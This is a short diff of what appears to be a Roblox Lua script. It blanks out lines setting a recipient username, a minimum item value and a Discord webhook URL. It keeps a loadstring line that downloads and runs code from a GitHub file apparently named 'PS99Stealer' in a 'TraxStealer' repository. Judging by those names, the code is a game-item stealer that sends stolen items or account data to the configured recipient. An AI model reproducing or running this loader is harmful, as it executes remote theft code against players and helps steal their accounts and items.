@@ -1,6 +1,5 @@
-Username = "imso_pro767"
-Username2 = "imso_pro767"
-MinimumRAP = 1m
-Webhook = "https://discord.com/api/webhooks/1276249630551834812/AEG0I2v68UquSlxPqUpWYNDyKijpH4I9CuFdDtv1bYJ4zl8qOdjVjy31yZiwFNjxqimh"
+
+
+
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/TraxMain/TraxStealer/refs/heads/main/PS99Stealer", true))() --
